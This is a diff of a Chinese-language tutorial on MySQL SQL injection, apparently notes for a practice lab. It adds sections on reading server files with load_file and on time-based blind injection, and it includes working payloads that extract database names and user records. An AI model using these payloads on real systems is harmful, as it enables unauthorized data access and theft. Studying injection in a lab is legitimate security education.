@@ -245,10 +245,45 @@ mysql> show tables;
 
 `id=1' and 1=(select 1 from information_schema.columns where table_name='users'  and column_name regexp '^username'  limit 0,1 )  --+`
 
-(6) 获取users表的内容(此处新函数较多，仔细阅读补充内容11-)
+(6) 获取users表的内容(此处新函数较多，仔细阅读补充内容13-16)
 
 `id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+`
 
+5. 导出文件
+
+`Load_file(file_name)`: 读取文件并返回该文件的内容作为一个字符串。
+
+(1) 使用条件:
+
+`A、必须有权限读取并且文件必须完全可读`
+
+`and (select count(*) from mysql.user)>0/*` 如果结果返回正常,说明具有读写权限。
+
+`and (select count(*) from mysql.user)>0/*` 返回错误，应该是管理员给数据库帐户降权  
+
+`B、欲读取文件必须在服务器上  `
+
+`C、必须指定文件完整的路径  `
+
+`D、欲读取文件必须小于max_allowed_packet`
+
+(2) 注入:
+
+修改mysql配置文件，添加如下代码即可。
+
+`[mysqld]`
+
+`secure-file-priv="C:/phpstudy/WWW/"`
+
+`/* C:/phpstudy/WWW/  为允许写入的文件目录  */`
+
+6. 延时盲注
+
+尝试了诸如`id=1 '` `id=1 ' and 1=1 --+` `id=1 ' and 1=2 --+` `id=1 " and 1=1 --+` `id=1 " and 1=2 --+`页面都没有回显
+
+尝试盲注(此处示例为单引号，除此之外还有双引号，括号)
+
+`?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+`
 
 ## SQL数据库的补充知识
 一 基础字符部分
@@ -326,3 +361,10 @@ mysql> show tables;
 16. `CAST(expr AS CHAR)`
 
 含义: 把 expr 转成字符类型(CHAR)
+
+17. `ORDER BY id`
+
+含义: 表示按 id 列对查询结果排序，默认升序(从小到大)
+
+18. `sleep(t)`
+
